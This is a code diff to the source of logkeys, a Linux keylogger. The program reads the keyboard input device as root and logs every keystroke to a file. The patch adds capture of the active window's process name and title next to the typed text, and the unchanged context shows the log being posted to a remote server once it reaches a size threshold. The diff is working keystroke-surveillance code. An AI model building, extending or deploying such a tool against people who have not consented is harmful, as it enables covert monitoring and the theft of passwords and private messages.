@@ -59,6 +59,8 @@
 #define DEFAULT_LOG_FILE  "/var/log/logkeys.log"
 #define PID_FILE          "/var/run/logkeys.pid"
 
+#define TIME_FORMAT "%F %T%z > "  // results in YYYY-mm-dd HH:MM:SS+ZZZZ
+
 #include "usage.cc"      // usage() function
 #include "args.cc"       // global arguments struct and arguments parsing
 #include "keytables.cc"  // character and function key tables and helper functions
@@ -80,37 +82,6 @@ std::string execute(const char* cmd)
     pclose(pipe);
     return result;
 }
-
-////old version that needs #include <X11/Xlib.h>
-/* 
-std::string get_current_window_name()
-{
-  
-  std::string result = execute(COMMAND_STR_AWPNAME);
-
-  return "{"+result+"}";
-
-
-  ////old version, X11 needed
-  Display *display;
-  Window focus;
-  int revert;
-  char *window_name;
-  std::string result;
-
-  //getcurrentwindowname
-  display = XOpenDisplay(NULL);
-  if(XGetInputFocus(display, &focus, &revert)==0)
-    return "{}";
-  if(XFetchName(display, focus, &window_name)==0)
-    return "{}";
-
-  result = window_name;
-
-  return "{"+result+"}";
-}*/
-////
-
 
 int input_fd = -1;  // input event device file descriptor; global so that signal_handler() can access it
 
@@ -402,6 +373,59 @@ void determine_input_device()
   seteuid(0); setegid(0);
 }
 
+// write newline then add timestamp and programinfo
+////event is wrong use refercen or pointer
+inline int newline(FILE *& out, struct input_event event, bool program_changed, std::string program_info) {
+  char timestamp[32];
+  int inc_size = fprintf(out, "\n");
+
+  if (!(args.flags & FLAG_NO_TIMESTAMPS)) {
+    strftime(timestamp, sizeof(timestamp), TIME_FORMAT, localtime(&event.time.tv_sec));
+    inc_size += fprintf(out, "%s", timestamp);
+  }
+  if (program_changed)
+    inc_size += fprintf(out, "%s", program_info.c_str());
+
+  return inc_size;
+}
+
+inline int encode_char(FILE *& out, unsigned int scan_code, bool altgr_in_effect, bool shift_in_effect) {
+  int inc_size = 0;
+  if (is_char_key(scan_code)) {
+    wchar_t wch;
+    if (altgr_in_effect) {
+      wch = altgr_keys[to_char_keys_index(scan_code)];
+      if (wch == L'\0') {
+        if(shift_in_effect)
+          wch = shift_keys[to_char_keys_index(scan_code)];
+        else
+          wch = char_keys[to_char_keys_index(scan_code)];
+      }
+    } 
+    else if (shift_in_effect) {
+      wch = shift_keys[to_char_keys_index(scan_code)];
+      if (wch == L'\0')
+        wch = char_keys[to_char_keys_index(scan_code)];
+    }
+    else  // neither altgr nor shift are effective, this is a normal char
+      wch = char_keys[to_char_keys_index(scan_code)];
+    
+    if (wch != L'\0') 
+    inc_size += fprintf(out, "%lc", wch);  // write character to log file
+  }
+  else if (is_func_key(scan_code)) {
+    if (!(args.flags & FLAG_NO_FUNC_KEYS)) {  // only log function keys if --no-func-keys not requested
+      inc_size += fprintf(out, "%ls", func_keys[to_func_keys_index(scan_code)]);
+    } 
+    else if (scan_code == KEY_SPACE || scan_code == KEY_TAB) {
+      inc_size += fprintf(out, " ");  // but always log a single space for Space and Tab keys
+    }
+  }
+  else 
+    inc_size += fprintf(out, "<E-%x>", scan_code);  // keycode is neither of character nor function, log error
+  
+  return inc_size;
+}
 
 int main(int argc, char **argv)
 {  
@@ -500,7 +524,6 @@ int main(int argc, char **argv)
   
   time_t cur_time;
   time(&cur_time);
-#define TIME_FORMAT "%F %T%z > "  // results in YYYY-mm-dd HH:MM:SS+ZZZZ
   strftime(timestamp, sizeof(timestamp), TIME_FORMAT, localtime(&cur_time));
   
   if (args.flags & FLAG_NO_TIMESTAMPS)
@@ -509,13 +532,15 @@ int main(int argc, char **argv)
     file_size += fprintf(out, "Logging started ...\n\n");
   
   fflush(out);
-  
+
+  //// programinfo
   std::string window_id;
   std::string old_window_id;
   std::string cur_process_name; 
   std::string cur_window_name;
   std::string program_info;
-
+  bool program_changed = false;
+  
   // infinite loop: exit gracefully by receiving SIGHUP, SIGINT or SIGTERM (of which handler closes input_fd)
   while (read(input_fd, &event, sizeof(struct input_event)) > 0) {
     
@@ -534,7 +559,20 @@ int main(int argc, char **argv)
       if (inc_size > 0) file_size += inc_size;
       continue;
     }
-    
+
+    //// on processid change update program_info write '[process name] "process title" > '
+    //// on process title change (like firefox tabs) would be better. possibly more ressource intensive?
+    if (args.flags & FLAG_PROGRAMINFO) {
+      window_id = execute(COMMAND_STR_AWID);
+      
+      if (window_id.compare(old_window_id) != 0) {
+        cur_process_name = execute(COMMAND_STR_AWPNAME);
+        cur_window_name = execute(COMMAND_STR_AWTITLE);
+        program_info = "[" + cur_process_name.erase(cur_process_name.size() - 1) + "] " + cur_window_name.erase(cur_window_name.size() - 1) + " > "; // delete newline (why are newlines)
+        program_changed = true;
+      }
+    }
+
     // if remote posting is enabled and size treshold is reached
     if (args.post_size != 0 && file_size >= args.post_size && stat(UPLOADER_PID_FILE, &st) == -1) {
       fclose(out);
@@ -573,7 +611,9 @@ int main(int argc, char **argv)
         }
       }
     }
-    
+
+    ////possible conflict if key repeated and program changed???
+
     // on key repeat ; must check before on key press
     if (event.value == EV_REPEAT) {
       ++count_repeats;
@@ -590,70 +630,24 @@ int main(int argc, char **argv)
 
     // on key press
     if (event.value == EV_MAKE) {
-      //// write [process name] "process title" >
-      window_id = execute(COMMAND_STR_AWID);
-      if (window_id.compare(old_window_id) != 0) { // diff window
-        cur_process_name = execute(COMMAND_STR_AWPNAME);
-        cur_window_name = execute(COMMAND_STR_AWTITLE);
-        program_info = "[" + cur_process_name.erase(cur_process_name.size() - 1) + "] " + cur_window_name.erase(cur_window_name.size() - 1) + " > "; // delete newline (why are newlines)
-        inc_size += fprintf(out, "%s%s", timestamp, program_info.c_str());  // then newline and timestamp 
+      // on ENTER key or Ctrl+C/Ctrl+D event append timestamp and programinfo
+      if (scan_code == KEY_ENTER || scan_code == KEY_KPENTER) {
+        inc_size += newline(out, event, program_changed, program_info);
       }
+      else if (program_changed || (ctrl_in_effect && (scan_code == KEY_C || scan_code == KEY_D))) {
+        inc_size += newline(out, event, program_changed, program_info);
+        inc_size += encode_char(out, scan_code, altgr_in_effect, shift_in_effect);
+      }
+      else { // normal char
+        if (scan_code == KEY_LEFTSHIFT || scan_code == KEY_RIGHTSHIFT)
+          shift_in_effect = true;
+        if (scan_code == KEY_RIGHTALT)
+          altgr_in_effect = true;
+        if (scan_code == KEY_LEFTCTRL || scan_code == KEY_RIGHTCTRL)
+          ctrl_in_effect = true;
 
-      // on ENTER key or Ctrl+C/Ctrl+D event append timestamp
-      if (scan_code == KEY_ENTER || scan_code == KEY_KPENTER ||
-          (ctrl_in_effect && (scan_code == KEY_C || scan_code == KEY_D))) {
-        if (ctrl_in_effect)
-          inc_size += fprintf(out, "%lc", char_keys[to_char_keys_index(scan_code)]);  // log C or D
-        if (args.flags & FLAG_NO_TIMESTAMPS)
-          inc_size += fprintf(out, "%s\n", program_info.c_str());
-        else {
-          strftime(timestamp, sizeof(timestamp), "\n" TIME_FORMAT, localtime(&event.time.tv_sec));
-          inc_size += fprintf(out, "%s%s", timestamp, program_info.c_str());  // then newline and timestamp 
-        }
-        if (inc_size > 0) file_size += inc_size;
-        continue;  // but don't log "<Enter>"
+        inc_size += encode_char(out, scan_code, altgr_in_effect, shift_in_effect); // print character or string coresponding to received keycode; only print chars when not \0
       }
-      
-      if (scan_code == KEY_LEFTSHIFT || scan_code == KEY_RIGHTSHIFT)
-        shift_in_effect = true;
-      if (scan_code == KEY_RIGHTALT)
-        altgr_in_effect = true;
-      if (scan_code == KEY_LEFTCTRL || scan_code == KEY_RIGHTCTRL)
-        ctrl_in_effect = true;
-      
-      // print character or string coresponding to received keycode; only print chars when not \0
-      if (is_char_key(scan_code)) {
-        wchar_t wch;
-        if (altgr_in_effect) {
-          wch = altgr_keys[to_char_keys_index(scan_code)];
-          if (wch == L'\0') {
-            if(shift_in_effect)
-              wch = shift_keys[to_char_keys_index(scan_code)];
-            else
-              wch = char_keys[to_char_keys_index(scan_code)];
-          }
-        } 
-        else if (shift_in_effect) {
-          wch = shift_keys[to_char_keys_index(scan_code)];
-          if (wch == L'\0')
-            wch = char_keys[to_char_keys_index(scan_code)];
-        }
-        else  // neither altgr nor shift are effective, this is a normal char
-          wch = char_keys[to_char_keys_index(scan_code)];
-        
-        if (wch != L'\0') inc_size += fprintf(out, "%lc", wch);  // write character to log file
-      }
-      else if (is_func_key(scan_code)) {
-        if (!(args.flags & FLAG_NO_FUNC_KEYS)) {  // only log function keys if --no-func-keys not requested
-          inc_size += fprintf(out, "%ls", func_keys[to_func_keys_index(scan_code)]);
-        } 
-        else if (scan_code == KEY_SPACE || scan_code == KEY_TAB) { //// shouldn't tab get an extra function key code?
-          inc_size += fprintf(out, " ");  // but always log a single space for Space and Tab keys
-        }
-      }
-      else inc_size += fprintf(out, "<E-%x>", scan_code);  // keycode is neither of character nor function, log error
-      
-      old_window_id = window_id;
     } // if (EV_MAKE)
     
     // on key release
@@ -665,10 +659,17 @@ int main(int argc, char **argv)
       if (scan_code == KEY_LEFTCTRL || scan_code == KEY_RIGHTCTRL)
         ctrl_in_effect = false;
     }
+
+    // update program id
+    if (args.flags & FLAG_PROGRAMINFO) { 
+      old_window_id = window_id;
+      program_changed = false;
+    }
     
     prev_code = scan_code;
     fflush(out);
-    if (inc_size > 0) file_size += inc_size;
+    if (inc_size > 0) 
+      file_size += inc_size;
     
   } // while (read(input_fd))
   
